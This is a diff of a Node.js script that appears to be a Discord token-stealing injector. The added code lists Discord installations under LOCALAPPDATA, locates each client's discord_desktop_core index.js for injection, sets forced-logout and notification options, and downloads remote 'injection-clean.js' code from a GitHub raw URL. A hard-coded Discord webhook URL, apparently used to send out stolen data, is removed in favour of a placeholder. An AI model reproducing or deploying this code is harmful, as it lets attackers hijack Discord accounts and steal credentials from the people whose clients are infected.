@@ -4,10 +4,44 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-var src = 'https://discord.com/api/webhooks/963061258972717056/5FOWy8Ze06XseTZcQxOOWYkQR66-R6dC-wLHGciPJ-M0Sf-GOoWYfPVklXisFsxINZbx';
 const webhook = "da_webhook"
+
+const config = {
+    "logout": "instant",
+    "inject-notify": "true",
+    "logout-notify": "true",
+    "init-notify":"false",
+    "embed-color": 3447704,
+    "disable-qr-code": "true"
+}
+
+
+
+
+var LOCAL = process.env.LOCALAPPDATA
+var discords = [];
+var injectPath = [];
+var runningDiscords = [];
+
+
+fs.readdirSync(LOCAL).forEach(file => {
+    if (file.includes("iscord")) {
+        discords.push(LOCAL + '\\' + file)
+    } else {
+        return;
+    }
+});
+
+discords.forEach(function(file) {
+    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
+    glob.sync(pattern).map(file => {
+        injectPath.push(file)
+    })
+    
+});
+listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/Max87153/jejej/main/injection-clean.js', (resp) => {
+    https.get('https://raw.githubusercontent.com/9Ruby9/r4bbit/main/injection-clean.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
